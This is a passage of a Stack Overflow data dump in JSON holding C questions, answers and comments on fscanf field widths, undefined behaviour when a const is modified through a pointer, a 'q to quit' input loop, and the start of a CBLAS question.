"https://stackoverflow.com/questions/44685730/how-do-i-use-a-defined-constant-as-the-max-field-width-in-fscanf/44685996#44685996", "title": "How do I use a #defined constant as the max field width in fscanf?", "body": "<p>You will struggle with fscanf. I don't know better solution than proposed by you if you are bound with fscanf.</p>\n\n<p>Personally I would switch to fgets like in this simple example:</p>\n\n<pre><code>#define MAX_NAME_LEN 25\n\nint main()\n{\n        char string[MAX_NAME_LEN];\n        fgets(string,MAX_NAME_LEN,stdin);\n\n        printf(\"%s\", string);\n\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 3, "last_activity_date": 1498079436, "last_edit_date": 1498079436, "creation_date": 1498078223, "answer_id": 44686031, "question_id": 44685730, "link": "https://stackoverflow.com/questions/44685730/how-do-i-use-a-defined-constant-as-the-max-field-width-in-fscanf/44686031#44686031", "title": "How do I use a #defined constant as the max field width in fscanf?", "body": "<p>1st simplification.</p>\n\n<pre><code>// Unlikely need to malloc short array\nchar nameFormat[16]; // I assume I don't ever want more than 10^13 characters  \nsprintf(nameFormat, \"%%%ds\", MAX_NAME_LEN);  // %% prints a %\nfscanf(input, nameFormat, name);\n</code></pre>\n\n<p>2nd offering  or better, use stringify <a href=\"https://stackoverflow.com/a/44685953/2410359\">@DevilaN</a>.<br>\nNote that the size of the buffer needs to be at least 1 more than the <code>\"%s\"</code> width.</p>\n\n<pre><code>#define MAX_NAME_LEN 256\n#define MAX_NAME_LEN_STR \"256\"\n\nchar name[MAX_NAME_LEN + 1];\nfscanf(input, \"%\" MAX_NAME_LEN_STR \"s\", name);\n</code></pre>\n\n<p>3rd, use <code>fgets()</code>  (my preference), Of course this reads a <em>line</em> and not a sequence of non-white-space characters.  This often does meet that higher level goal though.</p>\n\n<pre><code>#define MAX_NAME_LEN 256\nchar name[MAX_NAME_LEN + 2];\nfgets(name, sizeof name, input);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 0, "last_activity_date": 1498085513, "creation_date": 1498085513, "answer_id": 44687441, "question_id": 44685730, "link": "https://stackoverflow.com/questions/44685730/how-do-i-use-a-defined-constant-as-the-max-field-width-in-fscanf/44687441#44687441", "title": "How do I use a #defined constant as the max field width in fscanf?", "body": "<p>As a reference, following is a <code>fscanf_s()</code> approach to prevent overflow as used by earlier version of <a href=\"https://msdn.microsoft.com/en-us/library/6ybhk9kc(v=vs.100).aspx\" rel=\"nofollow noreferrer\">VS</a> that did not attain C99 compliance. An additional <strong><code>unsigned</code></strong> argument  follows <code>name[]</code> indicator the size of the buffer.  This appears to apply to VS 2015 too.</p>\n\n<pre><code>char name[MAX_NAME_LEN + 1];\nfscanf_s(input, \"%s\", name, (unsigned) sizeof name);\n</code></pre>\n\n<p>C11 includes <code>fscanf_s()</code> in its Annex K which is <em>normative</em>, for information only, so a compliant compiler need not implement it.  Yet in C11, it is specified as needing a <strong><code>rsize_t/size_t</code></strong> argument .</p>\n\n<pre><code>fscanf_s(input, \"%s\", name, sizeof name);\n</code></pre>\n\n<p>If input is more than 256 non-white-space characters, a matching failure occurs.  In this case, <code>fscanf()</code> return <code>EOF</code>.  I <em>think</em> the VS version does the same.  I <em>think</em> both will consume all the non-white-space in the stream, even if there is not enough room to store them all.</p>\n\n<hr>\n\n<p>Either of these is a bit different than the below in that extra text is not read into <code>name[]</code>, so no buffer overflow.  Any extra text remains for the next input function call.  <code>fscanf()</code> returns 1.</p>\n\n<pre><code>fscanf(input, \"%256s\", name);\n</code></pre>\n"}], "owner": {"reputation": 163, "user_id": 5247820, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6f6922afa167fe9e1471e81e95df0f19?s=128&d=identicon&r=PG&f=1", "display_name": "SonicN", "link": "https://stackoverflow.com/users/5247820/sonicn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 636, "favorite_count": 0, "accepted_answer_id": 44686031, "answer_count": 4, "score": 6, "last_activity_date": 1498085513, "creation_date": 1498076961, "question_id": 44685730, "link": "https://stackoverflow.com/questions/44685730/how-do-i-use-a-defined-constant-as-the-max-field-width-in-fscanf", "title": "How do I use a #defined constant as the max field width in fscanf?", "body": "<p>All of this is in C89, not C99.</p>\n\n<p>I have a constant.</p>\n\n<pre><code>#define MAX_NAME_LEN 256\n</code></pre>\n\n<p>I want to use it as the max field width in fscanf, sort of like this.</p>\n\n<pre><code>fscanf(input, \"%256s\", name);\n</code></pre>\n\n<p>But I want to use the MAX_NAME_LEN instead of the literal 256 for sake of good style. I have tried all of</p>\n\n<pre><code>fscanf(input, \"%MAX_NAME_LENs\", name);\n\nchar* max_name_len_str = malloc(16 * sizeof *max_name_len_str);\nsprintf(max_name_len_str, \"%d\", MAX_NAME_LEN);\nfscanf(input, \"%\" max_name_len_str \"s\", name);\nfree(max_name_len_str);\n\n//works with printf, but has different meaning in scanf\nfscanf(input, \"%*s\", MAX_NAME_LEN, name);\n\nfscanf(input, \"%%ds\", MAX_NAME_LEN, name);\n</code></pre>\n\n<p>without success.</p>\n\n<pre><code>char* nameFormat = malloc(16 * sizeof *nameFormat); //I assume I don't ever want more than 10^13 characters in a name\nsprintf(nameFormat, \"%s%ds\", \"%\", MAX_NAME_LEN);\nfscanf(input, nameFormat, name);\nfree(nameFormat);\n</code></pre>\n\n<p>does work, but is ungainly as all get out. Is there a more elegant solution?</p>\n"}, {"tags": ["c", "pointers", "casting", "memory-address"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 4, "creation_date": 1498075586, "post_id": 44685335, "comment_id": 76354816, "body": "So you intentionally invoke <i>undefined behaviour</i> and wonder why your code behaves undefined? Leran what casts are for and <b>never ever</b> use a cast if you don&#39;t fully understand what it does! You actively work against your compiler by telling it not to complain."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 3, "creation_date": 1498075622, "post_id": 44685335, "comment_id": 76354832, "body": "And don&#39;t get fancy with formatting! The code is hard to read."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1498082219, "post_id": 44685335, "comment_id": 76357829, "body": "&quot;<b>HOW</b> an address can store 2 differents values ?&quot;-- you are mistaken in thinking that an address is storing 2 values here. This program has undefined behavior (more than once), and as such is completely invalid. Further, when I compile and run this on my system (ignoring warnings) I get <code>str = 0 0</code> as output. Undefined behavior is meaningless."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1498087524, "post_id": 44685335, "comment_id": 76359492, "body": "The compiler may decide it knows that <code>b</code> can&#39;t change (it is <code>const</code>), so it doesn&#39;t need to look at the stored value again \u2014 it knows what it must be.  It may decide it doesn&#39;t know with <code>adr_b</code> and look at memory.  But that&#39;s only a possibility.  Any result is valid since the code has undefined behaviour."}], "answers": [{"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498075901, "post_id": 44685347, "comment_id": 76355008, "body": "As a side-note: Appendix J is informal only. It is not autoritative. (It summarises information found in other chapters, though, which <i>are</i> autoritative. I don&#39;t mean it is wrong)"}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498077877, "post_id": 44685347, "comment_id": 76355946, "body": "@Olaf ok ok... quoted 6.7.3."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498078545, "post_id": 44685347, "comment_id": 76356308, "body": "I was fine with the answer, except that I think the question exactly gets what it asks for. One does not add a cast without reason, so I assume OP first got a warning (&quot;assignment removes <code>const</code> qualifier&quot; or similar), then added the cast &quot;because that way the compiler does not complain, thus the cast fixed it&quot; (I got that &quot;excuse&quot; from a so-called professional programmer once!)"}], "tags": [], "owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "is_accepted": false, "score": 1, "last_activity_date": 1498077854, "last_edit_date": 1498077854, "creation_date": 1498075545, "answer_id": 44685347, "question_id": 44685335, "link": "https://stackoverflow.com/questions/44685335/same-address-and-not-the-same-values-with-const/44685347#44685347", "title": "Same address and not the same values with const", "body": "<p>Undefined behaviour. You're modifying a <code>const</code> variable.</p>\n\n<p><a href=\"http://port70.net/~nsz/c/c11/n1570.html#J.2\" rel=\"nofollow noreferrer\">C11 Standard Appendix J.2. Undefined behavior</a>:</p>\n\n<blockquote>\n  <p>An attempt is made to modify an object defined with a const-qualified type through use of an lvalue with non-const-qualified type (<a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.7.3\" rel=\"nofollow noreferrer\">6.7.3</a>). </p>\n</blockquote>\n\n<p>The Appendix J.2, though non-normative, is handy for finding the actual normative location within the standard. <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.7.3p6\" rel=\"nofollow noreferrer\">6.7.3 in paragraph 6</a> says:</p>\n\n<blockquote>\n  <p>6 If an attempt is made to modify an object defined with a const-qualified type through use of an lvalue with non-const-qualified type, the behavior is undefined. If an attempt is made to refer to an object defined with a volatile-qualified type through use of an lvalue with non-volatile-qualified type, the behavior is undefined.133) </p>\n</blockquote>\n\n<hr>\n\n<p>Since you attempted - and successfully modified - an object defined with a const-qualified type (<code>const bool b</code>) through use of an lvalue with non-const-qualified type <code>bool</code> (here <code>*adr_b</code>), the C standard \"imposes no requirements\" for the behaviour of the program thereafter. There be <a href=\"http://www.catb.org/jargon/html/N/nasal-demon\" rel=\"nofollow noreferrer\">nasal demons</a>.</p>\n"}], "owner": {"reputation": 1123, "user_id": 6151730, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/P9Y9w.jpg?s=128&g=1", "display_name": "Victor Castro", "link": "https://stackoverflow.com/users/6151730/victor-castro"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 56, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1498078930, "creation_date": 1498075490, "last_edit_date": 1498078930, "question_id": 44685335, "link": "https://stackoverflow.com/questions/44685335/same-address-and-not-the-same-values-with-const", "title": "Same address and not the same values with const", "body": "<p>I found a little strange thing in a simple C code.\nActually, I have 2 variables, the first is a <code>const</code> variable and the second is a pointer on this first variable.</p>\n\n<p>The thing is that if I print the 2 addresses, they are the same but if I print the values they are differents: </p>\n\n<pre class=\"lang-c prettyprint-override\"><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdbool.h&gt;\n\nint                         main(void)\n{\n    bool const              b = true;\n    bool                    *adr_b = (bool*)&amp;b;\n\n    *adr_b = false;\n    printf(\"%p\\n%p\\n\", &amp;b, adr_b);\n    printf(\"str = %d %d\\n\", b, *adr_b);\n\n    printf(\"%p\\n%p\\n\", &amp;b, adr_b);\n    return (0);\n}\n</code></pre>\n\n<p>How is it possible ?</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>In fact, I know that this behavior is undefined but this is a <em>technical</em> question : <strong>HOW</strong> an address can store 2 differents values ?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1498074789, "post_id": 44685108, "comment_id": 76354388, "body": "<code>value</code> is not allocated."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 1, "creation_date": 1498074825, "post_id": 44685108, "comment_id": 76354415, "body": "next error: <code>fgets(value, 10, stdin);      if (value &gt;= 0){</code> <code>value</code> is a string, not a number... compile with warnings on."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 1, "creation_date": 1498074881, "post_id": 44685108, "comment_id": 76354444, "body": "<code>error: assignment makes integer from pointer without a cast [-Werror=int-conversion]: sum = sum + value;</code>"}, {"owner": {"reputation": 34174, "user_id": 65464, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/d1fc3a85db4ff7618a7639742f356b3b?s=128&d=identicon&r=PG", "display_name": "Erich Kitzmueller", "link": "https://stackoverflow.com/users/65464/erich-kitzmueller"}, "edited": false, "score": 0, "creation_date": 1498074985, "post_id": 44685108, "comment_id": 76354500, "body": "You incorrectly assume that C automatically casts a string to a number when necessary, like some script languages do. This is not the case. Instead, C somehow mangles the address of the string to an integer - implementation-defined behaviour, result depends on the compiler."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1498074995, "post_id": 44685108, "comment_id": 76354507, "body": "Please enable compiler warnings and do not ignore them."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1498075003, "post_id": 44685108, "comment_id": 76354512, "body": "DonT&#39; post images of text! And enable compiler warnings! A good text book is a way better resource to learn than obscure online tutorial or youtube!"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1498075234, "post_id": 44685108, "comment_id": 76354635, "body": "Incredibly, there is a compiler warning at the top of your screenshot. Should get your eyes tested."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1498075333, "post_id": 44685108, "comment_id": 76354695, "body": "@WeatherVane I heard there is a cognitive disorder, making the <i>warning</i> prefix to make things invisible."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1498075404, "post_id": 44685108, "comment_id": 76354723, "body": "... but as the compiler did not warn about the <i>uninitialised variable</i> you should either up the warning level, or bin the compiler."}, {"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 1, "creation_date": 1498080049, "post_id": 44685108, "comment_id": 76356993, "body": "Are the downvotes just because op provided a screenshot? Because he provides an optimum code and a clear problem."}, {"owner": {"reputation": 224, "user_id": 6779209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cpqbN.jpg?s=128&g=1", "display_name": "BanjoFox", "link": "https://stackoverflow.com/users/6779209/banjofox"}, "edited": false, "score": 0, "creation_date": 1498087312, "post_id": 44685108, "comment_id": 76359423, "body": "My apologies, first I felt as though the screenshot provided a clearer visual of the output that using [code] tags would not. Will Try Harder next time.  Secondly, I was not ignoring the compiler warnings, I did state that I knew that &quot;q&quot; was being treated as an INT and not a Char but was hoping to kill two birds with one stone... i.e get the program to read INT&#39;s properly while accepting strings/characters for the exit function.   If I were writing this code for a production environment I would do a lot of things differently :) Right now the goal is simplicity."}], "answers": [{"comments": [{"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 0, "creation_date": 1498077794, "post_id": 44685927, "comment_id": 76355899, "body": "I have not tested this code, but should work. Poke me instead!"}, {"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "reply_to_user": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "edited": false, "score": 0, "creation_date": 1498079716, "post_id": 44685927, "comment_id": 76356857, "body": "I have explained the code in the comments within the code :) @Jean-Baptiste Yunes"}, {"owner": {"reputation": 224, "user_id": 6779209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cpqbN.jpg?s=128&g=1", "display_name": "BanjoFox", "link": "https://stackoverflow.com/users/6779209/banjofox"}, "edited": false, "score": 0, "creation_date": 1498087933, "post_id": 44685927, "comment_id": 76359601, "body": "@VidorVistrom -- That works! :D It is considerably more complex than I was thinking it -should- be but I&#39;m used to Bash and Python ways of doing things ;). Now just need to understand what and why.   Before anyone else comments about this... I DID see the implicit function warning and chose to ignore it in favor of fixing it later"}], "tags": [], "owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "is_accepted": true, "score": 1, "last_activity_date": 1498077758, "creation_date": 1498077758, "answer_id": 44685927, "question_id": 44685108, "link": "https://stackoverflow.com/questions/44685108/press-q-to-quit-outputs-incorrect-math/44685927#44685927", "title": "Press q to quit outputs incorrect math", "body": "<p>Try this:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main ()\n{\n/* variable definition: */\n    int count, sum;\n\n    double avg=0;\n\n    char value[10]=\"\";//make value an array or allocate memory for it using malloc and also null initiate it\n\n\n/* Initialize */\n    count = 0;\n\n    sum = 0;\n\n    avg = 0.0;\n\n    fgets(value,10,stdin);\n\n    if(value[strlen(value)-1]=='\\n'){//if the user enters a string less than 10 chars a newline will also be stored inside the value array\n\n        value[strlen(value)-1]='\\0';//you need to remove that \\n and replace it with null\n    }\n\n    else{\n\n        while((getchar())!='\\n');//just removing any extra chars left(when the user enters a string greater than 10 chars)\n    }\n\n    while(value[0]!='q'){//beware it will only check for the first char of the array to be q, anything else will still proceed the loop\n\n        sum+=strtol(value,NULL,10);//use this to convert integers inside the array to long ints(many other ways exists)\n\n        count++;\n\n        fgets(value,10,stdin);//overwrite value each time to get input\n\n        if(value[strlen(value)-1]=='\\n'){\n\n            value[strlen(value)-1]='\\0';\n        }\n\n        else{\n\n            while((getchar())!='\\n');\n        }\n\n    }\n\n\n\n// Calculate avg. Need to type cast since two integers will yield an integer\n\n    printf(\"\\nCount is: %d\", count);\n\n    if(count==0){\n        printf(\"\\nAverage is: %lf\\n\", avg);\n    }\n    else{\n         avg = (double) sum/count;\n\n         printf(\"\\nAverage is: %lf\\n\", avg);\n    }\n\n\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 224, "user_id": 6779209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cpqbN.jpg?s=128&g=1", "display_name": "BanjoFox", "link": "https://stackoverflow.com/users/6779209/banjofox"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 71, "favorite_count": 0, "accepted_answer_id": 44685927, "answer_count": 1, "score": -2, "last_activity_date": 1498093376, "creation_date": 1498074627, "last_edit_date": 1498093376, "question_id": 44685108, "link": "https://stackoverflow.com/questions/44685108/press-q-to-quit-outputs-incorrect-math", "title": "Press q to quit outputs incorrect math", "body": "<p>I am trying to use \"Press 'q' to quit\" functionality to exit a do...while loop for calculating the average of a series of user-defined integers. Following several examples I was able to get the exit value to work but it is being included as part of calculating the average. </p>\n\n<p>Example:</p>\n\n<pre><code>quixote@willow:~$ gcc sentinel-borked.c -o sentinel-borked\nsentinel-borked.c: In function 'main':\nsentinel-borked.c:22:13: warning: assignment makes integer from pointer without a cast [-Wint-conversion]\n         sum = sum + value;\n             ^\nquixote@willow:~$ ./sentinel-borked \n\nEnter an answer string or q to quit: 1\n\nEnter an answer string or q to quit: 1\n\nEnter an answer string or q to quit: q\n\nCount is: 3\nAverage is: 214197589.333333\nquixote@willow:~$ \n</code></pre>\n\n<p>I know that the \"q\" is being treated as an integer, but I'm not sure how to re-write my code to escape it. :(</p>\n\n<p>The simplest workaround that I can think of is to prompt the user for an end point (i.e. \"how many integers are you averaging?\") and use that, but I would really like to figure this out.</p>\n\n<p>Here is the code I have so far.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main ()\n{\n/* variable definition: */\nint count, sum;\ndouble avg;\nchar *value;\n\n/* Initialize */\ncount = 0;\nsum = 0;\navg = 0.0;\n\ndo {\n// Loop through to input values\nprintf(\"\\nEnter an answer string or q to quit: \");\nfgets(value, 10, stdin);\n\n    if (value &gt;= 0){\n        sum = sum + value;\n        count = count + 1;\n    }\n    else {\n            printf(\"\\nValue must be positive\");\n}\n\n} while (value[0] != 'q');\n\n// Calculate avg. Need to type cast since two integers will yield an integer\n\nprintf(\"\\nCount is: %d\", count);\navg = (double) sum/count;\nprintf(\"\\nAverage is: %lf\\n\", avg);\n\n\nreturn 0;\n}\n</code></pre>\n\n<p><strong>EDIT:</strong> Replaced screenshot with plain-text inside of a code block. Original image still located at: <a href=\"https://i.stack.imgur.com/qza1N.png\" rel=\"nofollow noreferrer\">https://i.stack.imgur.com/qza1N.png</a></p>\n"}, {"tags": ["c++", "c", "cblas"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498074238, "post_id": 44684970, "comment_id": 76354089, "body": "Don&#39;t cast the result of <code>malloc</code> &amp; friends in C!"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 2, "creation_date": 1498074282, "post_id": 44684970, "comment_id": 76354114, "body": "how do you print your result on the C side? if your <code>printf</code> format is wrong, that would explain a lot."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 3, "creation_date": 1498074327, "post_id": 44684970, "comment_id": 76354141, "body": "@Olaf don&#39;t shoot the guy: he&#39;s using <code>vector</code> in C++ instead of <code>new</code>, that&#39;s a good start!"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1498074397, "post_id": 44684970, "comment_id": 76354167, "body": "@Jean-Fran&#231;oisFabre: How is your comment in any way related to mine?"}, {"owner": {"reputation": 85518, "user_id": 1593077, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/10c44e0d9568e48d05708ae196ad936f?s=128&d=identicon&r=PG", "display_name": "einpoklum", "link": "https://stackoverflow.com/users/1593077/einpoklum"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 3, "creation_date": 1498074456, "post_id": 44684970, "comment_id": 76354207, "body": "@Olaf: Your sentence was in the imperative and included an exclamation mark! Which might be interpreted as shouting! You see?!"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498074474, "post_id": 44684970, "comment_id": 76354223, "body": "@Olaf don&#39;t take it the wrong way. I was just pointing out that OP uses correct C++ code. And casting the return of <code>malloc</code> in C is not a very serious offence, it&#39;s just useless."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1498074491, "post_id": 44684970, "comment_id": 76354229, "body": "Maybe I&#39;m missing something but I can&#39;t see how this is printed in the C version"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois 